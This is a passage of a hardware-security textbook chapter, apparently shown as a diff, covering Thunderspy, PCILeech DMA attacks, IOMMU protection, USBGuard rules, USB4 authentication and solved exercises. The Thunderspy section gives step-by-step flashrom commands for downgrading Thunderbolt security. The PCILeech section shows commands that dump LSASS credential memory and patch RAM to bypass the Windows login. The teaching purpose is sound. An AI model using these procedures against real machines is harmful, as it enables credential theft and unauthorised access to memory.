+<p>Defence: current-limiting polyfuse (PolySelf PTC thermistor, e.g., Littelfuse 1812L150) on the VBUS line, rated to trip at 1.5 A, protecting the host from overcurrent. Commercial laptops with USB-PD protection (VBUS overcurrent detection in the PD controller) partially mitigate this but are not universally immune.</p>
+<h2 id="sec-thunderspy"><span class="secnum">35.7</span> Thunderspy – Thunderbolt Security Vulnerabilities<a class="headerlink" href="#sec-thunderspy" title="Permanent link">&para;</a></h2>
+<p>Thunderspy (Bjorn Ruytenberg, May 2020): seven Thunderbolt security vulnerabilities allowing complete bypass of Thunderbolt security levels on systems without Kernel DMA Protection.</p>
+<div class="tbl" id="tab-thunderspy">
+<div class="tbl-caption"><strong>Table 35.3.</strong> Thunderspy vulnerabilities (Ruytenberg, 2020).</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Vuln #</strong></th>
+<th style="text-align: left;"><strong>Description</strong></th>
+<th style="text-align: left;"><strong>Impact</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">1</td>
+<td style="text-align: left;">Inadequate firmware verification schemes</td>
+<td style="text-align: left;">Unsigned firmware flashable</td>
+</tr>
+<tr>
+<td style="text-align: left;">2</td>
+<td style="text-align: left;">Weak device authentication scheme</td>
+<td style="text-align: left;">Device identity spoofable</td>
+</tr>
+<tr>
+<td style="text-align: left;">3</td>
+<td style="text-align: left;">Use of unauthenticated device metadata</td>
+<td style="text-align: left;">Metadata forgeable without key</td>
+</tr>
+<tr>
+<td style="text-align: left;">4</td>
+<td style="text-align: left;">Backwards-compatibility downgrade attack</td>
+<td style="text-align: left;">Force SL0 on SL1/SL2 devices</td>
+</tr>
+<tr>
+<td style="text-align: left;">5</td>
+<td style="text-align: left;">Unauthenticated Thunderbolt controller config</td>
+<td style="text-align: left;">Config registers writable</td>
+</tr>
+<tr>
+<td style="text-align: left;">6</td>
+<td style="text-align: left;">Missing SPI flash interface defences</td>
+<td style="text-align: left;">SPI read/write from port</td>
+</tr>
+<tr>
+<td style="text-align: left;">7</td>
+<td style="text-align: left;">No Thunderbolt on Boot Camp Macs</td>
+<td style="text-align: left;">macOS Boot Camp bypasses all SL</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h3 id="3571-thunderspy-attack-procedure"><span class="secnum">35.7.1</span> Thunderspy Attack Procedure<a class="headerlink" href="#3571-thunderspy-attack-procedure" title="Permanent link">&para;</a></h3>
+<p>Required hardware: SPI flash programmer (e.g., Bus Pirate, Dediprog SF100) with SOIC-8 clip for attaching to the Thunderbolt controller’s SPI NOR flash. Attack steps:</p>
+<ol>
+<li>
+<p>Open laptop (Phillips PH0/PH1, 5–15 screws), identify Thunderbolt controller SPI flash</p>
+</li>
+<li>
+<p>Attach SOIC-8 clip to the 8-pin SPI NOR (typically Winbond W25Q64 or similar)</p>
+</li>
+<li>
+<p>Dump current SPI flash: <code>flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r tb_backup.bin</code></p>
+</li>
+<li>
+<p>Modify security level register (offset varies by model): set SL = 0x00 (no security)</p>
+</li>
+<li>
+<p>Flash modified image: <code>flashrom -p buspirate_spi -w tb_patched.bin</code></p>
+</li>
+<li>
+<p>Reboot – Thunderbolt port now accepts any PCIe device without authorisation</p>
+</li>
+<li>
+<p>Connect PCILeech FPGA – full DMA access to system RAM achieved in <span class="arithmatex">\(\leq 5\)</span> minutes</p>
+</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code># Thunderspy SPI flash extraction (Kali Linux + Bus Pirate)
+$ sudo apt install flashrom
+$ flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M \
+           -c W25Q64BV -r thunderbolt_firmware.bin
+
+# Modify security level field (TB controller vendor-specific offset)
+$ python3 thunderspy_patch.py thunderbolt_firmware.bin --set-sl 0
+
+# Write back
+$ flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M \
+           -c W25Q64BV -w thunderbolt_firmware_patched.bin
+</code></pre></div>
+<h2 id="sec-pcileech"><span class="secnum">35.8</span> PCILeech DMA Attack<a class="headerlink" href="#sec-pcileech" title="Permanent link">&para;</a></h2>
+<figure class="fig fig-diagram" id="fig-pcileech">
+<img class="tikz" src="img/tikz-012a34ea8e3a.svg" alt="PCILeech DMA attack path: FPGA board connects via Thunderbolt or M.2 PCIe slot, submits DMA requests to read/write victim system RAM. Intel VT-d IOMMU, if enabled, blocks unauthorised DMA…" loading="lazy">
+<figcaption><strong>Figure 35.2.</strong> PCILeech DMA attack path: FPGA board connects via Thunderbolt or M.2 PCIe slot, submits DMA requests to read/write victim system RAM. Intel VT-d IOMMU, if enabled, blocks unauthorised DMA transactions. Thunderspy bypasses IOMMU by downgrading TBT security.</figcaption>
+</figure>
+
+<h3 id="3581-pcileech-hardware-options"><span class="secnum">35.8.1</span> PCILeech Hardware Options<a class="headerlink" href="#3581-pcileech-hardware-options" title="Permanent link">&para;</a></h3>
+<div class="tbl" id="tab-pcileech-hw">
+<div class="tbl-caption"><strong>Table 35.4.</strong> PCILeech-compatible DMA hardware options.</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Board</strong></th>
+<th style="text-align: left;"><strong>FPGA</strong></th>
+<th style="text-align: left;"><strong>Interface</strong></th>
+<th style="text-align: left;"><strong>Price</strong></th>
+<th style="text-align: left;"><strong>Notes</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Screamer M.2</td>
+<td style="text-align: left;">Artix-7 XC7A75T</td>
+<td style="text-align: left;">M.2 NVMe slot (PCIe x4)</td>
+<td style="text-align: left;">$350</td>
+<td style="text-align: left;">Most common for laptops</td>
+</tr>
+<tr>
+<td style="text-align: left;">AC701</td>
+<td style="text-align: left;">Artix-7 XC7A200T</td>
+<td style="text-align: left;">PCIe x4 (full size)</td>
+<td style="text-align: left;">$500</td>
+<td style="text-align: left;">Xilinx eval board</td>
+</tr>
+<tr>
+<td style="text-align: left;">LambdaConcept ECPIX-5</td>
+<td style="text-align: left;">ECP5-85F</td>
+<td style="text-align: left;">M.2 / PCIe x4</td>
+<td style="text-align: left;">$280</td>
+<td style="text-align: left;">Open-source bitstream</td>
+</tr>
+<tr>
+<td style="text-align: left;">PCIe Screamer R02</td>
+<td style="text-align: left;">Artix-7 XC7A35T</td>
+<td style="text-align: left;">PCIe x1 full size</td>
+<td style="text-align: left;">$250</td>
+<td style="text-align: left;">Budget option</td>
+</tr>
+<tr>
+<td style="text-align: left;">USB3380-EVB</td>
+<td style="text-align: left;">PLX USB3380 ASIC</td>
+<td style="text-align: left;">USB 3.0</td>
+<td style="text-align: left;">$200</td>
+<td style="text-align: left;">Lower bandwidth (USB 3.0)</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h3 id="3582-pcileech-software"><span class="secnum">35.8.2</span> PCILeech Software<a class="headerlink" href="#3582-pcileech-software" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code># PCILeech DMA attack (target: Windows 10 LSASS credential dump)
+# Attacker machine (Kali Linux + LeechCore library)
+
+# Dump physical memory range (0x1000 - 0x200000)
+$ ./pcileech dump -min 0x1000 -max 0x200000 -out memory.raw
+
+# Search for LSASS process (find process structure in RAM)
+$ ./pcileech pslist
+
+# Dump LSASS memory (process name or PID)
+$ ./pcileech py -s modules/lsass.py
+
+# Write to physical memory (bypass login screen -- DANGEROUS)
+$ ./pcileech patch -all -sig signatures/win10x64_unlock.sig
+
+# MemProcFS -- mount victim RAM as a virtual filesystem
+$ ./memprocfs -device fpga -mount /tmp/victim_ram
+$ ls /tmp/victim_ram/proc/lsass/    # see LSASS process memory files
+</code></pre></div>
+<h2 id="sec-kernel-dma"><span class="secnum">35.9</span> Kernel DMA Protection<a class="headerlink" href="#sec-kernel-dma" title="Permanent link">&para;</a></h2>
+<h3 id="3591-intel-vt-d-iommu"><span class="secnum">35.9.1</span> Intel VT-d IOMMU<a class="headerlink" href="#3591-intel-vt-d-iommu" title="Permanent link">&para;</a></h3>
+<p>Intel Virtualisation Technology for Directed I/O (VT-d) implements an Input-Output Memory Management Unit (IOMMU) in the PCH / CPU die. The IOMMU maintains a page-table structure (domain-specific mapping) that restricts each PCIe device to access only its assigned physical memory pages. DMA requests with physical addresses outside the allowed range are rejected by the hardware; an interrupt is raised to the OS.</p>
+<div class="language-text highlight"><pre><span></span><code># Linux: verify IOMMU is active
+$ cat /proc/cmdline | grep iommu
+# Should contain: intel_iommu=on iommu=pt  (or strict)
+
+# Check IOMMU groups
+$ for d in /sys/kernel/iommu_groups/*/devices/*; do
+    echo "Group $(basename $(dirname $d)): $d"
+  done
+
+# Verify Thunderbolt IOMMU policy
+$ cat /sys/bus/thunderbolt/devices/domain0/iommu_dma_protection
+# 1 = protected, 0 = vulnerable
+</code></pre></div>
+<h3 id="3592-thunderbolt-4-mandatory-security"><span class="secnum">35.9.2</span> Thunderbolt 4 Mandatory Security<a class="headerlink" href="#3592-thunderbolt-4-mandatory-security" title="Permanent link">&para;</a></h3>
+<p>Thunderbolt 4 (Intel, 2020) mandates Kernel DMA Protection on all platforms, making Thunderspy-style attacks non-functional even if the firmware security level is downgraded, because the IOMMU prevents unauthorised DMA regardless of TB security level. Thunderbolt 3 made Kernel DMA Protection optional; many TB3 laptops deployed without it.</p>
+<p>Windows 10 1803 and later: “Kernel DMA Protection” (also called Memory Access Protection) can be verified in <code>msinfo32.exe</code> under System Information. DMAR table (ACPI) must be present and populated by BIOS/UEFI.</p>
+<div class="language-text highlight"><pre><span></span><code># Windows: check Kernel DMA Protection status
+PS C:\&gt; Get-WmiObject -Class Win32_DeviceGuard -Namespace root/Microsoft/Windows/DeviceGuard |
+        Select-Object -Property VirtualizationBasedSecurityStatus, KernelDMAProtection
+# KernelDMAProtection = 1 means active
+
+# Registry check (requires reboot to take effect if changed)
+HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\
+    EnableVirtualizationBasedSecurity = 1
+    RequirePlatformSecurityFeatures = 3  (SecureBoot + DMA protection)
+</code></pre></div>
+<h2 id="sec-usb-policy"><span class="secnum">35.10</span> USB Policy Enforcement<a class="headerlink" href="#sec-usb-policy" title="Permanent link">&para;</a></h2>
+<h3 id="35101-linux-usbguard"><span class="secnum">35.10.1</span> Linux USBGuard<a class="headerlink" href="#35101-linux-usbguard" title="Permanent link">&para;</a></h3>
+<p>USBGuard implements a whitelist/blacklist policy engine for USB devices, enforcing rules based on USB Vendor ID, Product ID, Device Class, and serial number. Rules are evaluated at device insertion time.</p>
+<div class="language-text highlight"><pre><span></span><code># /etc/usbguard/rules.conf -- example security policy
+# Allow specific keyboard by VID:PID
+allow id 046d:c31c serial "" name "Logitech USB Keyboard" \
+      with-interface 03:01:01
+
+# Allow specific storage device by serial number
+allow id 0781:5581 serial "AA01234567890123" name "SanDisk Cruzer"
+
+# Block all USB storage class devices
+block id *:* with-interface equals { 08:*:* }
+
+# Block HID devices (except those explicitly allowed above)
+reject id *:* with-interface equals { 03:*:* }
+
+# Default: block anything not explicitly allowed
+block id *:*
+</code></pre></div>
+<div class="language-text highlight"><pre><span></span><code># USBGuard management commands
+$ sudo systemctl enable --now usbguard
+$ sudo usbguard list-devices         # show connected devices
+$ sudo usbguard allow-device 5       # allow device ID 5 permanently
+$ sudo usbguard block-device 5       # block device ID 5
+$ sudo usbguard generate-policy &gt; rules.conf  # generate from current devices
+</code></pre></div>
+<h3 id="35102-windows-usb-restrictions"><span class="secnum">35.10.2</span> Windows USB Restrictions<a class="headerlink" href="#35102-windows-usb-restrictions" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code># Windows registry: block all USB storage (Group Policy equivalent)
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UsbStor]
+"Start"=dword:00000004   ; 4 = disabled, 3 = enabled
+
+# Block USB storage via Group Policy (ADMX)
+Computer Configuration -&gt; Administrative Templates -&gt;
+  System -&gt; Removable Storage Access -&gt;
+    "Removable Disks: Deny execute access" = Enabled
+    "Removable Disks: Deny write access"   = Enabled
+    "Removable Disks: Deny read access"    = Enabled  (most restrictive)
+
+# Allow only specific VID:PID devices (Device Installation Restrictions)
+# Computer Config -&gt; Admin Templates -&gt; System -&gt; Device Installation -&gt;
+#   Restrict installation of devices not described by other policy settings
+</code></pre></div>
+<h2 id="sec-usb4"><span class="secnum">35.11</span> USB 3.2 and USB4 Security Improvements<a class="headerlink" href="#sec-usb4" title="Permanent link">&para;</a></h2>
+<p>USB4 (USB4 Specification v2.0, USB-IF, 2022): based on Thunderbolt 4 protocol, mandates:</p>
+<ul>
+<li>
+<p>USB4 v2 maximum speed: 80 Gbps (PAM-4 signalling)</p>
+</li>
+<li>
+<p>USB-IF Authentication (USB Type-C Authentication Specification, 2019): X.509 certificate chain, ECDSA P-256 signature over device descriptors, prevents USB device identity spoofing, certified by USB-IF (certbody)</p>
+</li>
+<li>
+<p>Mandatory IOMMU support for all USB4 DMA devices</p>
+</li>
+<li>
+<p>USB Power Delivery 3.1: 48 V / 5 A = 240 W maximum, programmable voltage requires PD policy enforcement in embedded controller</p>
+</li>
+</ul>
+<p>USB-IF Authentication protocol:</p>
+<div class="language-text highlight"><pre><span></span><code># USB Authentication Message Flow (USB Type-C Auth. Spec. Rev 1.0)
+Host -&gt; Device: GET_DIGESTS (request certificate chain hashes)
+Device -&gt; Host: DIGESTS (SHA-256 hashes of cert chain slots)
+Host -&gt; Device: GET_CERTIFICATE (request specific cert)
+Device -&gt; Host: CERTIFICATE (X.509 DER blob, max 4 KB per slot)
+Host -&gt; Device: CHALLENGE (64-byte random nonce)
+Device -&gt; Host: CHALLENGE_AUTH (ECDSA P-256 signature over nonce + cert hash)
+Host: Verify ECDSA signature against USB-IF root CA
+# If verification fails: block device access or limit to charging only
+</code></pre></div>
+<h2 id="sec-usb-pd"><span class="secnum">35.12</span> USB Power Delivery Security<a class="headerlink" href="#sec-usb-pd" title="Permanent link">&para;</a></h2>
+<p>USB PD 3.1 raises the maximum voltage to 48 V and power to 240 W. Security concerns:</p>
+<ul>
+<li>
+<p>A malicious charger (rogue power adapter) can negotiate a higher voltage than the device supports, potentially damaging the battery management IC</p>
+</li>
+<li>
+<p>Uncontrolled CC (Configuration Channel) communication: CC lines carry PD negotiation messages; a crafted PD message could trigger FRS (Fast Role Swap) or EPR (Extended Power Range) modes unexpectedly</p>
+</li>
+<li>
+<p>Charger attacks: inject voltage surges via VBUS after initial PD negotiation (“charger MitM” – intercept and modify PD data objects)</p>
+</li>
+</ul>
+<p>Defence: USB PD controller (e.g., FUSB302, Infineon CYPD3177) with firmware validation and hard voltage limits enforced in hardware by the Embedded Controller (EC), independent of host OS.</p>
+<h2 id="sec-usb-fpga"><span class="secnum">35.13</span> FPGA Implementation for USB Protocol Analysis<a class="headerlink" href="#sec-usb-fpga" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-usb-fpga">
+<div class="tbl-caption"><strong>Table 35.5.</strong> FPGA implementation for USB security analysis and enforcement.</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Device</strong></th>
+<th style="text-align: right;"><strong>LUTs</strong></th>
+<th style="text-align: right;"><strong>FFs</strong></th>
+<th style="text-align: right;"><strong>BRAMs</strong></th>
+<th style="text-align: right;"><strong>DSPs</strong></th>
+<th style="text-align: right;"><strong>Fmax (MHz)</strong></th>
+<th style="text-align: right;"><strong>Power (mW)</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Xilinx Artix-7 XC7A35T (USB2 analyser)</td>
+<td style="text-align: right;">6,200</td>
+<td style="text-align: right;">7,100</td>
+<td style="text-align: right;">18</td>
+<td style="text-align: right;">0</td>
+<td style="text-align: right;">120</td>
+<td style="text-align: right;">320</td>
+</tr>
+<tr>
+<td style="text-align: left;">Xilinx Artix-7 XC7A200T (PCILeech DMA)</td>
+<td style="text-align: right;">38,400</td>
+<td style="text-align: right;">42,000</td>
+<td style="text-align: right;">64</td>
+<td style="text-align: right;">12</td>
+<td style="text-align: right;">250</td>
+<td style="text-align: right;">2100</td>
+</tr>
+<tr>
+<td style="text-align: left;">Lattice ECP5-85F (USBguard inline)</td>
+<td style="text-align: right;">14,200</td>
+<td style="text-align: right;">16,800</td>
+<td style="text-align: right;">32</td>
+<td style="text-align: right;">0</td>
+<td style="text-align: right;">150</td>
+<td style="text-align: right;">680</td>
+</tr>
+<tr>
+<td style="text-align: left;">Intel Cyclone 10 LP (USB sniffer)</td>
+<td style="text-align: right;">8,400</td>
+<td style="text-align: right;">9,600</td>
+<td style="text-align: right;">24</td>
+<td style="text-align: right;">0</td>
+<td style="text-align: right;">100</td>
+<td style="text-align: right;">450</td>
+</tr>
+<tr>
+<td style="text-align: left;">Intel Agilex F (USB4 monitor)</td>
+<td style="text-align: right;">22,000</td>
+<td style="text-align: right;">26,400</td>
+<td style="text-align: right;">48</td>
+<td style="text-align: right;">8</td>
+<td style="text-align: right;">500</td>
+<td style="text-align: right;">3200</td>
+</tr>
+<tr>
+<td style="text-align: left;">Xilinx KU15P (TB4 security monitor)</td>
+<td style="text-align: right;">55,000</td>
+<td style="text-align: right;">64,000</td>
+<td style="text-align: right;">128</td>
+<td style="text-align: right;">32</td>
+<td style="text-align: right;">400</td>
+<td style="text-align: right;">7800</td>
+</tr>
+<tr>
+<td style="text-align: left;">Microsemi IGLOO2 (USB-PD policy eng.)</td>
+<td style="text-align: right;">4,800</td>
+<td style="text-align: right;">5,600</td>
+<td style="text-align: right;">8</td>
+<td style="text-align: right;">0</td>
+<td style="text-align: right;">80</td>
+<td style="text-align: right;">180</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="sec-usb-asic"><span class="secnum">35.14</span> ASIC Implementation<a class="headerlink" href="#sec-usb-asic" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-usb-asic">
+<div class="tbl-caption"><strong>Table 35.6.</strong> ASIC implementation for USB and Thunderbolt security functions.</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Process</strong></th>
+<th style="text-align: left;"><strong>Function</strong></th>
+<th style="text-align: right;"><strong>Area (mm<span class="math inline">\(^2\)</span>)</strong></th>
+<th style="text-align: right;"><strong>Power (mW)</strong></th>
+<th style="text-align: right;"><strong>Freq (MHz)</strong></th>
+<th style="text-align: right;"><strong>ECC</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">TSMC 16nm FF+</td>
+<td style="text-align: left;">Intel VT-d IOMMU</td>
+<td style="text-align: right;">8.2</td>
+<td style="text-align: right;">450</td>
+<td style="text-align: right;">2000</td>
+<td style="text-align: right;">ECC page table</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 7nm FinFET</td>
+<td style="text-align: left;">USB4 v2 controller</td>
+<td style="text-align: right;">14.0</td>
+<td style="text-align: right;">1200</td>
+<td style="text-align: right;">2400</td>
+<td style="text-align: right;">CRC-32</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 28nm</td>
+<td style="text-align: left;">USB2 Auth. engine</td>
+<td style="text-align: right;">1.4</td>
+<td style="text-align: right;">38</td>
+<td style="text-align: right;">200</td>
+<td style="text-align: right;">SHA-256</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 28nm</td>
+<td style="text-align: left;">ECDSA P-256 core</td>
+<td style="text-align: right;">2.8</td>
+<td style="text-align: right;">85</td>
+<td style="text-align: right;">250</td>
+<td style="text-align: right;">Parity</td>
+</tr>
+<tr>
+<td style="text-align: left;">Samsung 14nm</td>
+<td style="text-align: left;">TB4 PHY + controller</td>
+<td style="text-align: right;">22.0</td>
+<td style="text-align: right;">2800</td>
+<td style="text-align: right;">5000</td>
+<td style="text-align: right;">Reed-Solomon</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 40nm</td>
+<td style="text-align: left;">FUSB302 PD ctrl.</td>
+<td style="text-align: right;">3.2</td>
+<td style="text-align: right;">95</td>
+<td style="text-align: right;">100</td>
+<td style="text-align: right;">CRC-16</td>
+</tr>
+<tr>
+<td style="text-align: left;">GF 22nm FDX</td>
+<td style="text-align: left;">xHCI host ctrl.</td>
+<td style="text-align: right;">6.0</td>
+<td style="text-align: right;">280</td>
+<td style="text-align: right;">800</td>
+<td style="text-align: right;">ECC SRAM</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="sec-usb-solutions"><span class="secnum">35.15</span> Commercial and Open-Source Solutions<a class="headerlink" href="#sec-usb-solutions" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-usb-all-solutions">
+<div class="tbl-caption"><strong>Table 35.7.</strong> USB and Thunderbolt security solutions – all categories.</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Product / Tool</strong></th>
+<th style="text-align: left;"><strong>Vendor</strong></th>
+<th style="text-align: left;"><strong>Type</strong></th>
+<th style="text-align: left;"><strong>Notes</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">USBGuard</td>
+<td style="text-align: left;">Red Hat / OSS</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Linux USB whitelist policy engine</td>
+</tr>
+<tr>
+<td style="text-align: left;">Endpoint Protector</td>
+<td style="text-align: left;">CoSoSys</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">DLP, USB device control, Win/Mac/Linux</td>
+</tr>
+<tr>
+<td style="text-align: left;">Symantec DLP</td>
+<td style="text-align: left;">Broadcom</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Data Loss Prevention, USB blocking</td>
+</tr>
+<tr>
+<td style="text-align: left;">CrowdStrike Falcon USB</td>
+<td style="text-align: left;">CrowdStrike</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Endpoint USB device monitoring</td>
+</tr>
+<tr>
+<td style="text-align: left;">Carbon Black App Control</td>
+<td style="text-align: left;">VMware</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">USB device whitelist, application control</td>
+</tr>
+<tr>
+<td style="text-align: left;">McAfee Device Control</td>
+<td style="text-align: left;">Trellix</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">USB and port control, removable media</td>
+</tr>
+<tr>
+<td style="text-align: left;">BlockMaster SafeConsole</td>
+<td style="text-align: left;">BlockMaster</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Encrypted USB management</td>
+</tr>
+<tr>
+<td style="text-align: left;">GrIDguard IOMMU</td>
+<td style="text-align: left;">IOMMUguard</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Linux IOMMU policy enforcement</td>
+</tr>
+<tr>
+<td style="text-align: left;">PCILeech</td>
+<td style="text-align: left;">Ulf Frisk</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">DMA attack / forensics framework</td>
+</tr>
+<tr>
+<td style="text-align: left;">MemProcFS</td>
+<td style="text-align: left;">Ulf Frisk</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">RAM forensics via DMA as VFS</td>
+</tr>
+<tr>
+<td style="text-align: left;">Thunderspy</td>
+<td style="text-align: left;">Bjorn Ruytenberg</td>
+<td style="text-align: left;">Research</td>
+<td style="text-align: left;">TB security analysis, spycheck tool</td>
+</tr>
+<tr>
+<td style="text-align: left;">spycheck</td>
+<td style="text-align: left;">Ruytenberg / EFF</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Thunderspy vulnerability checker</td>
+</tr>
+<tr>
+<td style="text-align: left;">USB Rubber Ducky</td>
+<td style="text-align: left;">Hak5</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">HID injection pentesting tool</td>
+</tr>
+<tr>
+<td style="text-align: left;">Bash Bunny Mark II</td>
+<td style="text-align: left;">Hak5</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Advanced multi-vector USB pentester</td>
+</tr>
+<tr>
+<td style="text-align: left;">O.MG Cable</td>
+<td style="text-align: left;">MG / Hak5</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">WiFi HID implant cable</td>
+</tr>
+<tr>
+<td style="text-align: left;">USB Killer v3</td>
+<td style="text-align: left;">USBKill.com</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">Destructive overcurrent tester</td>
+</tr>
+<tr>
+<td style="text-align: left;">Wireshark usbmon</td>
+<td style="text-align: left;">Wireshark.org</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">USB protocol capture (Linux usbmon)</td>
+</tr>
+<tr>
+<td style="text-align: left;">USBPcap</td>
+<td style="text-align: left;">Tomasz Mon</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">USB protocol capture for Windows</td>
+</tr>
+<tr>
+<td style="text-align: left;">sigrok / PulseView</td>
+<td style="text-align: left;">sigrok.org</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Logic analyser, USB 2.0 decoder</td>
+</tr>
+<tr>
+<td style="text-align: left;">GreatFET One</td>
+<td style="text-align: left;">GreatScott Gadgets</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">USB host/device analysis, HW toolkit</td>
+</tr>
+<tr>
+<td style="text-align: left;">FaceDancer</td>
+<td style="text-align: left;">GreatScott Gadgets</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">USB device fuzzing framework</td>
+</tr>
+<tr>
+<td style="text-align: left;">LUNA</td>
+<td style="text-align: left;">GreatScott Gadgets</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">USB3 FPGA-based analyser</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="sec-usb-solved"><span class="secnum">35.16</span> Solved Problems<a class="headerlink" href="#sec-usb-solved" title="Permanent link">&para;</a></h2>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: BadUSB HID Descriptor Injection Analysis</p>
+<p>A modified Phison PS2251-03 firmware presents two USB interfaces: Interface 0 as a USB Mass Storage device (bInterfaceClass=0x08) and Interface 1 as a HID keyboard (bInterfaceClass=0x03, bInterfaceProtocol=0x01). The HID Report Descriptor specifies a keyboard with 6-key rollover. (a) How does the OS determine that Interface 1 is a keyboard? (b) Why cannot a simple USB whitelist based on VID:PID alone prevent this attack? (c) What USBGuard rule syntax would block this specific attack vector?</p>
+</div>
+<p><strong>Solution:</strong> <strong>(a) OS keyboard identification:</strong> The OS USB stack reads the Interface Descriptor for Interface 1: bInterfaceClass=0x03 (HID), bInterfaceSubClass=0x01 (Boot Interface), bInterfaceProtocol=0x01 (Keyboard). The OS then fetches the HID Report Descriptor via the <code>GET_DESCRIPTOR(HID_REPORT)</code> control transfer and loads the <code>usbhid</code> kernel module (Linux) or <code>HidUsb.sys</code> (Windows). The HID Report Descriptor is a byte stream describing input fields: <code>Usage Page (Generic Desktop), Usage (Keyboard), Input (Data|Array|Absolute)</code>.</p>
+<p><strong>(b) VID:PID whitelist limitation:</strong> A genuine SanDisk Cruzer and its BadUSB-modified clone share the same VID:PID (e.g., 0781:5581). The firmware modification changes only the Interface Descriptors (adding HID), not the device-level VID:PID. Therefore, a VID:PID whitelist would allow both the genuine and malicious device.</p>
+<p><strong>(c) USBGuard rule to block this attack:</strong></p>
+<div class="language-text highlight"><pre><span></span><code># Block any device presenting both MSC and HID interfaces simultaneously
+reject id *:* with-interface equals { 08:*:* 03:01:01 }
+# This matches ANY device that has BOTH MSC (08) AND HID keyboard (03:01:01)
+
+# Complementary: allow known-good storage without HID
+allow id 0781:5581 serial "AA01234567890123" \
+       with-interface equals { 08:06:50 }
+# Only MSC (08) / SCSI (06) / Bulk-Only (50), no HID interface
+</code></pre></div>
+<p>The key insight: USBGuard’s <code>with-interface</code> clause can match on the <em>set</em> of interfaces a device presents, blocking any device that presents an unexpected interface combination.</p>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: PCILeech DMA Memory Read Calculation</p>
+<p>A PCILeech FPGA board (Screamer M.2, Artix-7 XC7A75T) reads a victim’s physical memory via PCIe x4 at Gen 3 speed (1 GB/s per lane, 4 lanes = 4 GB/s raw bandwidth). PCIe TLP (Transaction Layer Packet) overhead is 20 bytes per 256-byte payload. (a) Calculate the effective DMA read throughput. (b) How long does it take to dump a full 32 GB RAM? (c) How does enabling VT-d IOMMU affect this?</p>
+</div>
+<p><strong>Solution:</strong> <strong>(a) Effective DMA throughput:</strong> PCIe Gen 3 x4 raw: 8 Gbps per lane <span class="arithmatex">\(\times\)</span> 4 = 32 Gbps = 4 GB/s. 8b/10b encoding overhead: 20% (Gen 3 uses 128b/130b, overhead 1.5%): Effective: <span class="arithmatex">\(4 \times (128/130) = 3.94\)</span> GB/s physical layer. TLP header overhead: 20 bytes per 256 bytes payload = 7.8% overhead. Net data throughput: <span class="arithmatex">\(3.94 \times (1 - 0.078) = 3.63\)</span> GB/s. Additional PCILeech FPGA limitation: the open-source bitstream typically achieves 1–2 GB/s in practice due to completion buffer depth and TLP sequencing. <strong>Practical effective throughput:  1.5 GB/s.</strong></p>
+<p><strong>(b) Time to dump 32 GB RAM:</strong> <span class="arithmatex">\(T = 32 \times 10^9 / (1.5 \times 10^9) = 21.3\)</span> seconds.</p>
